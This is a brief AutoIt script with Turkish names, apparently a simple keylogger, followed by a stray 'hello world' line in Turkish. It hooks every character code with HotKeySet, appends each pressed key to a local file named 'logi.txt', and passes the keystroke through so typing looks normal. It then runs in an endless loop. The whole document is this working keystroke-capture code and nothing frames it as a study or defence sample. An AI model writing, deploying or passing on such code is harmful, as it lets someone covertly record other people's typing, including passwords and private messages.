
For $i = 0 To 255
    HotKeySet(Chr($i),"basilantusfonksiyonu")
Next

Func basilantusfonksiyonu()
   $dosya=FileWrite("logi.txt",@HotKeyPressed)
   ControlSend("","","",@HotKeyPressed)
EndFunc

While 1
   Sleep(100);
WEnd
merhaba dünya